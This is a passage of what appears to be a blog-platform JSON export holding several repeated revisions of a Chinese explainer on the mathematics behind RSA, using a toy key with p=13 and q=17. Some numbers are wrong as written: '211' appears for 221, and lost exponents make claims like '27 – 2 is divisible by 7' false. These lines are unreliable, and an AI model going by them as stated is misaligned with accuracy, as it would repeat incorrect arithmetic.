不会造成信息的丢失.\\n  \\n让我们试想一下, 现在可以公开获取到的信息有 211 和 11, 如果攻击者想要解密数据就必须知道原数据的i次方对211取模的循环周期是多少(即192). 假设 211 是一个很大的数, 我们几乎没有办法把 221 分解成 13 和 17 的乘积. \\n\\n而作为生成秘钥对的一方, 我们知道 211 = 13 * 17, 进而知道原数据的i次方对211取模的循环周期是192, 那么现在, 我们要找出两个数 e 和 d ，使得 e 乘以 d 的结果除以 192 余 1 应该怎么做呢 ? \\n\\n还记得 `中国剩余定理` 吗? \\n\\n上面的问题可以写成数学表达式 `e · d mod 192 = 1`\\n\\n首先, 我们随便找一个和 192 互质的数 (这是可以做到的, 比方说, 可以不断生成小于 192 的质数, 直到找到一个不能整除 192 的为止），把它用作我们的 e (比如 11). 我们知道, 因为 11 和 192 互质, d 的解一定是存在的. \\n\\n让我们用 `扩展的辗转相除法` 再推导一次吧 !\\n\\n因为 192 除以 11 商 17 余 5,\\n即 17个11 比 1个192 少 5,\\n且 18个11 比 1个192 多 6,\\n那么, 35个11 比 2个192 多 1, 即 11 * 35 除以 192 商 2 余 1\\n\\n这正是我们需要的结果! d = 35\\n\\n现在, e 和 n 就可以作为加密钥匙公之于众, d 和 n 则是只有自己知道的解密钥匙. 因而，加密钥匙有时也被称作公钥, 解密钥匙有时也被称作私钥. 这就是RSA算法背后的数学原理了, 更多关于RSA算法计算过程中的优化细节可以阅读原文, 也非常我们值得仔细思考.\\n\\n<几何原本> 约于公元前300年由古希腊数学家 `欧几里得` 写成. 伟大的数学思想穿越2300多年的时空, 在今天这个互联网的时代大放异彩.\"}],[\"markdown\",{\"markdown\":\"看到网上有些人质疑`Matrix67`的数学能力, 我想引用某网友的评论表达我的观点\\n\\n![Screen-Shot-2019-09-13-at-4.44.23-PM](/content/images/2019/09/Screen-Shot-2019-09-13-at-4.44.23-PM.png)\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[10,6],[10,7],[10,8],[1,\"p\",[]]]}","created_at_ts":1568388046417,"created_at":"2019-09-13 15:20:46"},{"id":"5d7bb4bd3faccd0001d052c9","post_id":"5d7b12173faccd0001d04fc3","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"markdown\",{\"markdown\":\"> 原文链接 [跨越千年的RSA算法](https://www.matrix67.com/blog/archives/5100)\"}],[\"markdown\",{\"markdown\":\"在这个由互联网构筑的世界里, RSA算法几乎无处不在. 例如:\\n* 访问任何一个`https`证书加密的网站\\n* 通过SSH登录一台服务器\\n* 从GitHub上clone一个项目\\n\\n说来惭愧, 作为一名每天和`RSA算法`打交道的程序员, 直到最近学习了`Matrix67`大神讲解RSA算法的博客我才终于理解`RSA算法`到底是怎么一回事. 在真正介绍`RSA算法`之前作者用了大量的篇幅为读者填补了必要的数学基础, 文章共分为六个小节, 真正提到`RSA算法`的只有最后一个小节, 我之前也看过一两篇其他介绍`RSA算法`的文章, 但唯有这一次让我有一种豁然开朗的感觉.\\n\"}],[\"markdown\",{\"markdown\":\"### （一）可公度线段\\n\\n文章介绍了在<几何原本>中一种求取最大公约数的方法(Euclid 算法): 假设刚开始的两个数是 a 和 b ，其中 a > b ，那么把 a 除以 b 的余数记作 c ，把 b 除以 c 的余数记作 d ，c 除以 d 余 e ， d 除以 e 余 f ，等等等等，不断拿上一步的除数去除以上一步的余数。直到某一次除法余数为 0 了，那么此时的除数就是最终结果。因此， Euclid 算法又有一个形象的名字，叫做 `辗转相除法`\"}],[\"markdown\",{\"markdown\":\"###（二）中国剩余定理\\n\\n给出 m 个两两互质的整数，它们的乘积为 P, 假设有一个未知数 M, 如果我们已知 M 分别除以这 m 个数所得的余数, 那么在 0 到 P – 1 的范围内, 我们可以唯一地确定这个 M, 这可以看作是 M 的一个特解. 其他所有满足要求的 M ，则正好是那些除以 P 之后余数等于这个特解的数。\\n\\n`Bézout 定理` 是中国剩余定理的另一种形式. 如果 a 和 n 互质, 那么\\n\\n```\\n  a * x mod n = 1\\n  a * x mod n = 2 \\n  ...\\n  a * x mod n = n-1 \\n```\\n\\n以上所有方程都是有解的\\n\\n如果将第一个等式换成 `中国剩余定理` 的表达, 则可以表达描述为: a 和 n 互质, 那么在 0 到 a*n - 1 的范围内一定存在唯一的M, 使:\\n\\n```\\nM mod a = 0\\nM mod n = 1\\n```\\n\\n这里的 M 相当于上面的 `a * x`\"}],[\"markdown\",{\"markdown\":\"###（三）扩展的辗转相除\\n\\n根据中国剩余定理, 我们可以指定在 0 到 P-1 之间 M 一定有唯一解, 那么如何在已知m和余数的条件下求出这个M呢 ? 这就是 `扩展的辗转相除法`\\n\\n现在, 让我们尝试求解 115x mod 367 = 1, 根据中国剩余定理(或者说Bézout 定理), 由于 115 和 367 是互质的, 因此方程在 0 到 115 * 367 - 1 之间一定存在唯一解.\\n\\n我们解方程的基本思路是，不断寻找 115 的某个倍数以及 367 的某个倍数, 使得它们之间的差越来越小，直到最终变为 1.\\n\\n由 367 除以 115 得 3 余 22, \\n即 3 个 115 只比 367 少 22, \\n于是 15 个 115 就要比 5 个 367 少 110, \\n从而 16 个 115 就会比 5 个 367 多 5.\\n\\n好了，真正巧妙的就在这里了: \\n由 16 个 115 比 5 个 367 多 5, \\n可得 64 个 115 比 20 个 367 多 20\\n结合 3 个 115 比 1 个 367 少 22,\\n可得 67 个 115 比 21 个 367 少 2. \\n\\n再结合 \\\"少 2\\\" 和 \\\"多 5\\\" 两个式子，\\n由 67 个 115 比 21 个 367 少 2, \\n可得 134 个 115 比 42 个 367 少 4, \\n结合 16 个 115 比 5 个 367 多 5, \\n可得 150 个 115 比 47 个 367 多 1. \\n\\n这样，我们就解出了一个满足 115x mod 367 = 1 的 x , 即 x = 150. \\n\\n在求解过程, 我们相当于对 115 和 367 做了一遍辗转相除: 我们不断给出 115 的某个倍数和 367 的某个倍数, 通过辗转对比最近的两个结果, 让它们的差距从\\\"少 22\\\"缩小到\\\"多 5\\\", 再到\\\"少 2\\\", \\\"多 1\\\", 其中 22, 5, 2, 1 这几个数正是用辗转相除法求 115 和 367 的最大公约数时将会经历的数. 因而, 算法的步骤数仍然是对数级别的, 即使面对上百位上千位的大数, 计算机也毫无压力. \\n\\n这种求解方程 a · x mod n = b 的算法就叫做“扩展的辗转相除法”。\"}],[\"markdown\",{\"markdown\":\"### （四）Fermat 小定理\\n\\n1640 年, 法国业余数学家 Pierre de Fermat(通常译作\\\"费马\\\")发现, 如果 n 是一个质数的话, 那么对于任意一个数 a, a 的 n 次方减去 a 之后都将是 n 的倍数. 例如, 7 是一个质数, 于是 27 – 2, 37 – 3, 47 – 4, 甚至 1007 – 100, 统统都能被 7 整除. 关于费马小定理的证明, 读者可以参见原文.\\n\\nFermat 小定理有一个等价的表述: 如果 n 是一个质数的话, 那么对于任意一个数 a, 随着 i 的增加, a 的 i 次方除以 n 的余数将会呈现出长度为 n – 1 的周期性. \\n\\n为什么呢?\\n\\n根据费马小定理, a^n 与 a 的差能够被 n 整除, 这相当于 a^n 和 a 分别都除以 n 之后将会拥有相同的余数. 另一方面, a^i 除以 n 的余数, 完全由 a^i-1 除以 n 的余数决定, 比方说, 假如我们已经知道 33 除以 7 等于 3 余 6, 这表明 33 里包含 3 个 7 以及 1 个 6. 因此, 34 里就包含 9 个 7 以及 3 个 6, 或者说 9 个 7 以及 1 个 18. 为了得到 34 除以 7 的余数，实际上只需要看看 18 除以 7 余多少就行了. 可见, 要想算出 a^i-1 · a 除以 n 的余数，我们不需要完整地知道 a^i-1 的值, 只需要知道 a^i-1 除以 n 的余数就可以了\\n\\n*重点* 相乘之前事先对乘数取余不会对结果造成影响, 可用数学表达式表示为:\\n\\n```\\n(a * b) % p = (a % p * b % p) % p\\n```\\n\\n这也是取模运算的基本运算法则\\n\\n\\n值得注意的是, n – 1 并不见得是最小的周期. 如 2^i 除以 7 的余数情况, 余数序列确实存在长度为 6 的周期现象, 但实际上它有一个更小的周期 3.\\n\\n假如某个整数 n 等于两个质数 p, q 的乘积，那么对于任意一个整数 a ，写出 a^i 依次除以 n 所得的余数序列, p – 1 和 q – 1 的最小公倍数将成为该序列的一个周期. 事实上， p – 1 和 q – 1 的任意一个公倍数, 比如表达起来最方便的 (p – 1) × (q – 1), 也将成为该序列的一个周期.\"}],[\"markdown\",{\"markdown\":\"### （五）公钥加密的可能性\\n\\n加密算法和解密算法有可能是不对称的吗？\\n\\n小时候我经常在朋友之间表演这么一个数学小魔术: 让对方任意想一个三位数, 把这个三位数乘以 91 的乘积的末三位告诉我, 我便能猜出对方原来想的数是多少. 如果对方心里想的数是 123, 那么对方就计算出 123 × 91 等于 11193, 并把结果的末三位 193 告诉我. 看起来, 这么做似乎损失了不少信息, 让我没法反推出原来的数. 不过, 我仍然有办法: 只需要把对方告诉我的结果再乘以 11, 乘积的末三位就是对方刚开始想的数了. 你可以验证一下， 193 × 11 = 2123 ，末三位正是对方所想的秘密数字! 其实道理很简单, 91 乘以 11 等于 1001, 而任何一个三位数乘以 1001 后, 末三位显然都不变（例如 123 乘以 1001 就等于 123123 ）. 先让对方在他所想的数上乘以 91, 假设乘积为 X, 我再在 X 的基础上乘以 11, 其结果相当于我俩合作把原数乘以了 1001, 自然末三位又变了回去.\\n\\n不过, 加密和解密的过程不对称并不妨碍我们根据加密方法推出解密方法来, 虽然这可能得费些功夫. 比方说, 刚才的加密算法就能被破解: 猜出对方心里想的数相当于求解形如 91x mod 1000 = 193 的方程, 这可以利用扩展的辗转相除法很快求解出来. \\n\\n为了得到一个可以公开加密钥匙的算法, 我们需要一种在只知道加密钥匙的情况下, 构造出解密钥匙非常非常困难的算法。\\n\\n1970 年左右，科学家们开始认真地思考“公钥加密系统”的可能性。 1977 年，来自 MIT 的 Ron Rivest 、 Adi Shamir 和 Leonard Adleman 三个人合写了一篇论文，给出了一种至今仍然安全的公钥加密算法。随后，该算法以三人名字的首字母命名，即 RSA 算法。\\n\\nRSA 算法用到了一种非常犀利的不对称性——大数分解难题.\\n\\n这种不对称性的点在于, 我们可以很容易的判断一个数是否是质数(稍后会讲到), 进而可以很容易的生成一个很大的质数, 但是到目前为止, 我们却没有一种高效的方法, 判断将一个大数分解成两个质数的乘积.\\n\\n判断一个数是否是质数的方法, 可以搜索以下内容: \\n\\n```\\n Fermat 素性测试\\n Miller-Rabin 素性测试\\n AKS 素性测试\\n```\"}],[\"markdown\",{\"markdown\":\"### （六）RSA 算法\\n\\n 所有工作都准备就绪, 下面我们可以开始描述 RSA 算法了.\\n \\n  首先, 找两个质数, 比如说 13 和 17 (实际使用时, 我们会选取大得多的质数). 把它们乘在一起, 得 221. 再计算出 (13 – 1) × (17 – 1) = 192. 根据前面的结论, 任选一个数 a, 它的 i 次方除以 221 的余数将会呈现长度为 192 的周期(虽然可能存在更短的周期). 换句话说, 对于任意的一个 a, a, a^193, a^385, a^577 ... 除以 221 都拥有相同的余数. 注意到, 385 可以写成 11 × 35 ... 嘿嘿，这下我们就又能变数学小魔术了. 叫一个人随便想一个不超过 221 的数，比如 123. 算出 123 的 11 次方除以 221 的余数, 把结果告诉你. 如果他的计算是正确的, 你将会得到 115 这个数. 看上去, 我们似乎很难把 115 还原回去, 但实际上你只需要计算 115 的 35 次方, 它除以 221 的余数就会变回 123. 这是因为, 对方把他所想的数 123 连乘了 11 次, 得到了一个数 X, 你再把这个 X 乘以自身 35 次, 这相当于你们合作把 123 连乘了 385 次, 根据周期性现象, 它除以 221 的余数仍然是 123. 然而, 计算 35 个 X 连乘时, 反正我们要取乘积除以 221 的余数, 因此我们不必完整地获知 X 的值, 只需要知道 X 除以 221 的余数就够了. 因而, 让对方只告诉你 X 取余后的结果, 不会造成信息的丢失.\\n  \\n让我们试想一下, 现在可以公开获取到的信息有 211 和 11, 如果攻击者想要解密数据就必须知道原数据的i次方对211取模的循环周期是多少(即192). 假设 211 是一个很大的数, 我们几乎没有办法把 221 分解成 13 和 17 的乘积. \\n\\n而作为生成秘钥对的一方, 我们知道 211 = 13 * 17, 进而知道原数据的i次方对211取模的循环周期是192, 那么现在, 我们要找出两个数 e 和 d ，使得 e 乘以 d 的结果除以 192 余 1 应该怎么做呢 ? \\n\\n还记得 `中国剩余定理` 吗? \\n\\n上面的问题可以写成数学表达式 `e · d mod 192 = 1`\\n\\n首先, 我们随便找一个和 192 互质的数 (这是可以做到的, 比方说, 可以不断生成小于 192 的质数, 直到找到一个不能整除 192 的为止），把它用作我们的 e (比如 11). 我们知道, 因为 11 和 192 互质, d 的解一定是存在的. \\n\\n让我们用 `扩展的辗转相除法` 再推导一次吧 !\\n\\n因为 192 除以 11 商 17 余 5,\\n即 17个11 比 1个192 少 5,\\n且 18个11 比 1个192 多 6,\\n那么, 35个11 比 2个192 多 1, 即 11 * 35 除以 192 商 2 余 1\\n\\n这正是我们需要的结果! d = 35\\n\\n现在, e 和 n 就可以作为加密钥匙公之于众, d 和 n 则是只有自己知道的解密钥匙. 因而，加密钥匙有时也被称作公钥, 解密钥匙有时也被称作私钥. 这就是RSA算法背后的数学原理了, 更多关于RSA算法计算过程中的优化细节可以阅读原文, 也非常我们值得仔细思考.\\n\\n<几何原本> 约于公元前300年由古希腊数学家 `欧几里得` 所著. 伟大的数学思想穿越2300多年的时空, 在今天这个互联网的时代大放异彩.\"}],[\"markdown\",{\"markdown\":\"看到网上有些人质疑`Matrix67`的数学能力, 我想引用某网友的评论表达我的观点\\n\\n![Screen-Shot-2019-09-13-at-4.44.23-PM](/content/images/2019/09/Screen-Shot-2019-09-13-at-4.44.23-PM.png)\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[10,6],[10,7],[10,8],[1,\"p\",[]]]}","created_at_ts":1568388285799,"created_at":"2019-09-13 15:24:45"},{"id":"5d7bb4f53faccd0001d052cb","post_id":"5d7b12173faccd0001d04fc3","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"markdown\",{\"markdown\":\"> 原文链接 [跨越千年的RSA算法](https://www.matrix67.com/blog/archives/5100)\"}],[\"markdown\",{\"markdown\":\"在这个由互联网构筑的世界里, RSA算法几乎无处不在. 例如:\\n* 访问任何一个`https`证书加密的网站\\n* 通过SSH登录一台服务器\\n* 从GitHub上clone一个项目\\n\\n说来惭愧, 作为一名每天和`RSA算法`打交道的程序员, 直到最近学习了`Matrix67`大神讲解RSA算法的博客我才终于理解`RSA算法`到底是怎么一回事. 在真正介绍`RSA算法`之前作者用了大量的篇幅为读者填补了必要的数学基础, 文章共分为六个小节, 真正提到`RSA算法`的只有最后一个小节, 我之前也看过一两篇其他介绍`RSA算法`的文章, 但唯有这一次让我有一种豁然开朗的感觉.\\n\"}],[\"markdown\",{\"markdown\":\"### （一）可公度线段\\n\\n文章介绍了在<几何原本>中一种求取最大公约数的方法(Euclid 算法): 假设刚开始的两个数是 a 和 b ，其中 a > b ，那么把 a 除以 b 的余数记作 c ，把 b 除以 c 的余数记作 d ，c 除以 d 余 e ， d 除以 e 余 f ，等等等等，不断拿上一步的除数去除以上一步的余数。直到某一次除法余数为 0 了，那么此时的除数就是最终结果。因此， Euclid 算法又有一个形象的名字，叫做 `辗转相除法`\"}],[\"markdown\",{\"markdown\":\"###（二）中国剩余定理\\n\\n给出 m 个两两互质的整数，它们的乘积为 P, 假设有一个未知数 M, 如果我们已知 M 分别除以这 m 个数所得的余数, 那么在 0 到 P – 1 的范围内, 我们可以唯一地确定这个 M, 这可以看作是 M 的一个特解. 其他所有满足要求的 M ，则正好是那些除以 P 之后余数等于这个特解的数。\\n\\n`Bézout 定理` 是中国剩余定理的另一种形式. 如果 a 和 n 互质, 那么\\n\\n```\\n  a * x mod n = 1\\n  a * x mod n = 2 \\n  ...\\n  a * x mod n = n-1 \\n```\\n\\n以上所有方程都是有解的\\n\\n如果将第一个等式换成 `中国剩余定理` 的表达, 则可以表达描述为: a 和 n 互质, 那么在 0 到 a*n - 1 的范围内一定存在唯一的M, 使:\\n\\n```\\nM mod a = 0\\nM mod n = 1\\n```\\n\\n这里的 M 相当于上面的 `a * x`\"}],[\"markdown\",{\"markdown\":\"###（三）扩展的辗转相除\\n\\n根据中国剩余定理, 我们可以指定在 0 到 P-1 之间 M 一定有唯一解, 那么如何在已知m和余数的条件下求出这个M呢 ? 这就是 `扩展的辗转相除法`\\n\\n现在, 让我们尝试求解 115x mod 367 = 1, 根据中国剩余定理(或者说Bézout 定理), 由于 115 和 367 是互质的, 因此方程在 0 到 115 * 367 - 1 之间一定存在唯一解.\\n\\n我们解方程的基本思路是，不断寻找 115 的某个倍数以及 367 的某个倍数, 使得它们之间的差越来越小，直到最终变为 1.\\n\\n由 367 除以 115 得 3 余 22, \\n即 3 个 115 只比 367 少 22, \\n于是 15 个 115 就要比 5 个 367 少 110, \\n从而 16 个 115 就会比 5 个 367 多 5.\\n\\n好了，真正巧妙的就在这里了: \\n由 16 个 115 比 5 个 367 多 5, \\n可得 64 个 115 比 20 个 367 多 20\\n结合 3 个 115 比 1 个 367 少 22,\\n可得 67 个 115 比 21 个 367 少 2. \\n\\n再结合 \\\"少 2\\\" 和 \\\"多 5\\\" 两个式子，\\n由 67 个 115 比 21 个 367 少 2, \\n可得 134 个 115 比 42 个 367 少 4, \\n结合 16 个 115 比 5 个 367 多 5, \\n可得 150 个 115 比 47 个 367 多 1. \\n\\n这样，我们就解出了一个满足 115x mod 367 = 1 的 x , 即 x = 150. \\n\\n在求解过程, 我们相当于对 115 和 367 做了一遍辗转相除: 我们不断给出 115 的某个倍数和 367 的某个倍数, 通过辗转对比最近的两个结果, 让它们的差距从\\\"少 22\\\"缩小到\\\"多 5\\\", 再到\\\"少 2\\\", \\\"多 1\\\", 其中 22, 5, 2, 1 这几个数正是用辗转相除法求 115 和 367 的最大公约数时将会经历的数. 因而, 算法的步骤数仍然是对数级别的, 即使面对上百位上千位的大数, 计算机也毫无压力. \\n\\n这种求解方程 a · x mod n = b 的算法就叫做“扩展的辗转相除法”。\"}],[\"markdown\",{\"markdown\":\"### （四）Fermat 小定理\\n\\n1640 年, 法国业余数学家 Pierre de Fermat(通常译作\\\"费马\\\")发现, 如果 n 是一个质数的话, 那么对于任意一个数 a, a 的 n 次方减去 a 之后都将是 n 的倍数. 例如, 7 是一个质数, 于是 27 – 2, 37 – 3, 47 – 4, 甚至 1007 – 100, 统统都能被 7 整除. 关于费马小定理的证明, 读者可以参见原文.\\n\\nFermat 小定理有一个等价的表述: 如果 n 是一个质数的话, 那么对于任意一个数 a, 随着 i 的增加, a 的 i 次方除以 n 的余数将会呈现出长度为 n – 1 的周期性. \\n\\n为什么呢?\\n\\n根据费马小定理, a^n 与 a 的差能够被 n 整除, 这相当于 a^n 和 a 分别都除以 n 之后将会拥有相同的余数. 另一方面, a^i 除以 n 的余数, 完全由 a^i-1 除以 n 的余数决定, 比方说, 假如我们已经知道 33 除以 7 等于 3 余 6, 这表明 33 里包含 3 个 7 以及 1 个 6. 因此, 34 里就包含 9 个 7 以及 3 个 6, 或者说 9 个 7 以及 1 个 18. 为了得到 34 除以 7 的余数，实际上只需要看看 18 除以 7 余多少就行了. 可见, 要想算出 a^i-1 · a 除以 n 的余数，我们不需要完整地知道 a^i-1 的值, 只需要知道 a^i-1 除以 n 的余数就可以了\\n\\n*重点* 相乘之前事先对乘数取余不会对结果造成影响, 可用数学表达式表示为:\\n\\n```\\n(a * b) % p = (a % p * b % p) % p\\n```\\n\\n这也是取模运算的基本运算法则\\n\\n\\n值得注意的是, n – 1 并不见得是最小的周期. 如 2^i 除以 7 的余数情况, 余数序列确实存在长度为 6 的周期现象, 但实际上它有一个更小的周期 3.\\n\\n假如某个整数 n 等于两个质数 p, q 的乘积，那么对于任意一个整数 a ，写出 a^i 依次除以 n 所得的余数序列, p – 1 和 q – 1 的最小公倍数将成为该序列的一个周期. 事实上， p – 1 和 q – 1 的任意一个公倍数, 比如表达起来最方便的 (p – 1) × (q – 1), 也将成为该序列的一个周期.\"}],[\"markdown\",{\"markdown\":\"### （五）公钥加密的可能性\\n\\n加密算法和解密算法有可能是不对称的吗？\\n\\n小时候我经常在朋友之间表演这么一个数学小魔术: 让对方任意想一个三位数, 把这个三位数乘以 91 的乘积的末三位告诉我, 我便能猜出对方原来想的数是多少. 如果对方心里想的数是 123, 那么对方就计算出 123 × 91 等于 11193, 并把结果的末三位 193 告诉我. 看起来, 这么做似乎损失了不少信息, 让我没法反推出原来的数. 不过, 我仍然有办法: 只需要把对方告诉我的结果再乘以 11, 乘积的末三位就是对方刚开始想的数了. 你可以验证一下， 193 × 11 = 2123 ，末三位正是对方所想的秘密数字! 其实道理很简单, 91 乘以 11 等于 1001, 而任何一个三位数乘以 1001 后, 末三位显然都不变（例如 123 乘以 1001 就等于 123123 ）. 先让对方在他所想的数上乘以 91, 假设乘积为 X, 我再在 X 的基础上乘以 11, 其结果相当于我俩合作把原数乘以了 1001, 自然末三位又变了回去.\\n\\n不过, 加密和解密的过程不对称并不妨碍我们根据加密方法推出解密方法来, 虽然这可能得费些功夫. 比方说, 刚才的加密算法就能被破解: 猜出对方心里想的数相当于求解形如 91x mod 1000 = 193 的方程, 这可以利用扩展的辗转相除法很快求解出来. \\n\\n为了得到一个可以公开加密钥匙的算法, 我们需要一种在只知道加密钥匙的情况下, 构造出解密钥匙非常非常困难的算法。\\n\\n1970 年左右，科学家们开始认真地思考“公钥加密系统”的可能性。 1977 年，来自 MIT 的 Ron Rivest 、 Adi Shamir 和 Leonard Adleman 三个人合写了一篇论文，给出了一种至今仍然安全的公钥加密算法。随后，该算法以三人名字的首字母命名，即 RSA 算法。\\n\\nRSA 算法用到了一种非常犀利的不对称性——大数分解难题.\\n\\n这种不对称性的点在于, 我们可以很容易的判断一个数是否是质数(稍后会讲到), 进而可以很容易的生成一个很大的质数, 但是到目前为止, 我们却没有一种高效的方法, 判断将一个大数分解成两个质数的乘积.\\n\\n判断一个数是否是质数的方法, 可以搜索以下内容: \\n\\n```\\n Fermat 素性测试\\n Miller-Rabin 素性测试\\n AKS 素性测试\\n```\"}],[\"markdown\",{\"markdown\":\"### （六）RSA 算法\\n\\n 所有工作都准备就绪, 下面我们可以开始描述 RSA 算法了.\\n \\n  首先, 找两个质数, 比如说 13 和 17 (实际使用时, 我们会选取大得多的质数). 把它们乘在一起, 得 221. 再计算出 (13 – 1) × (17 – 1) = 192. 根据前面的结论, 任选一个数 a, 它的 i 次方除以 221 的余数将会呈现长度为 192 的周期(虽然可能存在更短的周期). 换句话说, 对于任意的一个 a, a, a^193, a^385, a^577 ... 除以 221 都拥有相同的余数. 注意到, 385 可以写成 11 × 35 ... 嘿嘿，这下我们就又能变数学小魔术了. 叫一个人随便想一个不超过 221 的数，比如 123. 算出 123 的 11 次方除以 221 的余数, 把结果告诉你. 如果他的计算是正确的, 你将会得到 115 这个数. 看上去, 我们似乎很难把 115 还原回去, 但实际上你只需要计算 115 的 35 次方, 它除以 221 的余数就会变回 123. 这是因为, 对方把他所想的数 123 连乘了 11 次, 得到了一个数 X, 你再把这个 X 乘以自身 35 次, 这相当于你们合作把 123 连乘了 385 次, 根据周期性现象, 它除以 221 的余数仍然是 123. 然而, 计算 35 个 X 连乘时, 反正我们要取乘积除以 221 的余数, 因此我们不必完整地获知 X 的值, 只需要知道 X 除以 221 的余数就够了. 因而, 让对方只告诉你 X 取余后的结果, 不会造成信息的丢失.\\n  \\n让我们试想一下, 现在可以公开获取到的信息有 211 和 11, 如果攻击者想要解密数据就必须知道原数据的i次方对211取模的循环周期是多少(即192). 假设 211 是一个很大的数, 我们几乎没有办法把 221 分解成 13 和 17 的乘积. \\n\\n而作为生成秘钥对的一方, 我们知道 211 = 13 * 17, 进而知道原数据的i次方对211取模的循环周期是192, 那么现在, 我们要找出两个数 e 和 d ，使得 e 乘以 d 的结果除以 192 余 1 应该怎么做呢 ? \\n\\n还记得 `中国剩余定理` 吗? \\n\\n上面的问题可以写成数学表达式 `e · d mod 192 = 1`\\n\\n首先, 我们随便找一个和 192 互质的数 (这是可以做到的, 比方说, 可以不断生成小于 192 的质数, 直到找到一个不能整除 192 的为止），把它用作我们的 e (比如 11). 我们知道, 因为 11 和 192 互质, d 的解一定是存在的. \\n\\n让我们用 `扩展的辗转相除法` 再推导一次吧 !\\n\\n因为 192 除以 11 商 17 余 5,\\n即 17个11 比 1个192 少 5,\\n且 18个11 比 1个192 多 6,\\n那么, 35个11 比 2个192 多 1, 即 11 * 35 除以 192 商 2 余 1\\n\\n这正是我们需要的结果! d = 35\\n\\n现在, e 和 n 就可以作为加密钥匙公之于众, d 和 n 则是只有自己知道的解密钥匙. 因而，加密钥匙有时也被称作公钥, 解密钥匙有时也被称作私钥. 这就是RSA算法背后的数学原理了, 更多关于RSA算法计算过程中的优化细节可以阅读原文, 也非常我们值得仔细思考.\\n\\n<几何原本> 约于公元前300年由古希腊数学家 `欧几里得` 所著. 伟大的数学思想穿越2300多年的时空, 在今天这个互联网的时代大放异彩.\"}],[\"image\",{}],[\"markdown\",{\"markdown\":\"看到网上有些人质疑`Matrix67`的数学能力, 我想引用某网友的评论表达我的观点\\n\\n![Screen-Shot-2019-09-13-at-4.44.23-PM](/content/images/2019/09/Screen-Shot-2019-09-13-at-4.44.23-PM.png)\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[10,6],[10,7],[10,8],[10,9],[1,\"p\",[]]]}","created_at_ts":1568388341946,"created_at":"2019-09-13 15:25:41"},{"id":"5d7bb4fb3faccd0001d052cd","post_id":"5d7b12173faccd0001d04fc3","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"markdown\",{\"markdown\":\"> 原文链接 [跨越千年的RSA算法](https://www.matrix67.com/blog/archives/5100)\"}],[\"markdown\",{\"markdown\":\"在这个由互联网构筑的世界里, RSA算法几乎无处不在. 例如:\\n* 访问任何一个`https`证书加密的网站\\n* 通过SSH登录一台服务器\\n* 从GitHub上clone一个项目\\n\\n说来惭愧, 作为一名每天和`RSA算法`打交道的程序员, 直到最近学习了`Matrix67`大神讲解RSA算法的博客我才终于理解`RSA算法`到底是怎么一回事. 在真正介绍`RSA算法`之前作者用了大量的篇幅为读者填补了必要的数学基础, 文章共分为六个小节, 真正提到`RSA算法`的只有最后一个小节, 我之前也看过一两篇其他介绍`RSA算法`的文章, 但唯有这一次让我有一种豁然开朗的感觉.\\n\"}],[\"markdown\",{\"markdown\":\"### （一）可公度线段\\n\\n文章介绍了在<几何原本>中一种求取最大公约数的方法(Euclid 算法): 假设刚开始的两个数是 a 和 b ，其中 a > b ，那么把 a 除以 b 的余数记作 c ，把 b 除以 c 的余数记作 d ，c 除以 d 余 e ， d 除以 e 余 f ，等等等等，不断拿上一步的除数去除以上一步的余数。直到某一次除法余数为 0 了，那么此时的除数就是最终结果。因此， Euclid 算法又有一个形象的名字，叫做 `辗转相除法`\"}],[\"markdown\",{\"markdown\":\"###（二）中国剩余定理\\n\\n给出 m 个两两互质的整数，它们的乘积为 P, 假设有一个未知数 M, 如果我们已知 M 分别除以这 m 个数所得的余数, 那么在 0 到 P – 1 的范围内, 我们可以唯一地确定这个 M, 这可以看作是 M 的一个特解. 其他所有满足要求的 M ，则正好是那些除以 P 之后余数等于这个特解的数。\\n\\n`Bézout 定理` 是中国剩余定理的另一种形式. 如果 a 和 n 互质, 那么\\n\\n```\\n  a * x mod n = 1\\n  a * x mod n = 2 \\n  ...\\n  a * x mod n = n-1 \\n```\\n\\n以上所有方程都是有解的\\n\\n如果将第一个等式换成 `中国剩余定理` 的表达, 则可以表达描述为: a 和 n 互质, 那么在 0 到 a*n - 1 的范围内一定存在唯一的M, 使:\\n\\n```\\nM mod a = 0\\nM mod n = 1\\n```\\n\\n这里的 M 相当于上面的 `a * x`\"}],[\"markdown\",{\"markdown\":\"###（三）扩展的辗转相除\\n\\n根据中国剩余定理, 我们可以指定在 0 到 P-1 之间 M 一定有唯一解, 那么如何在已知m和余数的条件下求出这个M呢 ? 这就是 `扩展的辗转相除法`\\n\\n现在, 让我们尝试求解 115x mod 367 = 1, 根据中国剩余定理(或者说Bézout 定理), 由于 115 和 367 是互质的, 因此方程在 0 到 115 * 367 - 1 之间一定存在唯一解.\\n\\n我们解方程的基本思路是，不断寻找 115 的某个倍数以及 367 的某个倍数, 使得它们之间的差越来越小，直到最终变为 1.\\n\\n由 367 除以 115 得 3 余 22, \\n即 3 个 115 只比 367 少 22, \\n于是 15 个 115 就要比 5 个 367 少 110, \\n从而 16 个 115 就会比 5 个 367 多 5.\\n\\n好了，真正巧妙的就在这里了: \\n由 16 个 115 比 5 个 367 多 5, \\n可得 64 个 115 比 20 个 367 多 20\\n结合 3 个 115 比 1 个 367 少 22,\\n可得 67 个 115 比 21 个 367 少 2. \\n\\n再结合 \\\"少 2\\\" 和 \\\"多 5\\\" 两个式子，\\n由 67 个 115 比 21 个 367 少 2, \\n可得 134 个 115 比 42 个 367 少 4, \\n结合 16 个 115 比 5 个 367 多 5, \\n可得 150 个 115 比 47 个 367 多 1. \\n\\n这样，我们就解出了一个满足 115x mod 367 = 1 的 x , 即 x = 150. \\n\\n在求解过程, 我们相当于对 115 和 367 做了一遍辗转相除: 我们不断给出 115 的某个倍数和 367 的某个倍数, 通过辗转对比最近的两个结果, 让它们的差距从\\\"少 22\\\"缩小到\\\"多 5\\\", 再到\\\"少 2\\\", \\\"多 1\\\", 其中 22, 5, 2, 1 这几个数正是用辗转相除法求 115 和 367 的最大公约数时将会经历的数. 因而, 算法的步骤数仍然是对数级别的, 即使面对上百位上千位的大数, 计算机也毫无压力. \\n\\n这种求解方程 a · x mod n = b 的算法就叫做“扩展的辗转相除法”。\"}],[\"markdown\",{\"markdown\":\"### 